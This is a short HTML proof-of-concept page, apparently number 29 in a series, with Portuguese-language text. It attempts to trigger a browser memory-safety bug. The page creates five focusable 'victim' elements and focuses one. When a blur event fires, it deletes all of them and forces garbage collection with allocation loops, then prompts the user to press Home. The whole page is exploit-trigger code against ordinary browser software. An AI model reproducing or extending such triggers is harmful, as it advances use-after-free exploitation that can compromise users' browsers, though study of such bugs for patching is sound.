<!DOCTYPE html>
<html>
<body>
<p>PoC 29 - múltiplos victims</p>
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n - 1);
    }
    for (var i = 0; i < 30000; i++) gcRec(15);
    var junk = [];
    for (var i = 0; i < 100; i++) junk.push(new ArrayBuffer(2 * 1024 * 1024));
}

let victims = [];
for (let i = 0; i < 5; i++) {
    let el = document.createElement('div');
    el.tabIndex = 0;
    el.textContent = 'Victim ' + i;
    document.body.appendChild(el);
    victims.push(el);
}
victims[0].focus();

function killAll() {
    victims.forEach(v => { try { v.remove(); } catch(e) {} });
    victims = [];
    gc();
}

document.addEventListener('blur', killAll, true);
window.addEventListener('blur', killAll, true);

result.textContent = 'Aperte Home agora';
</script>
</body>
</html>
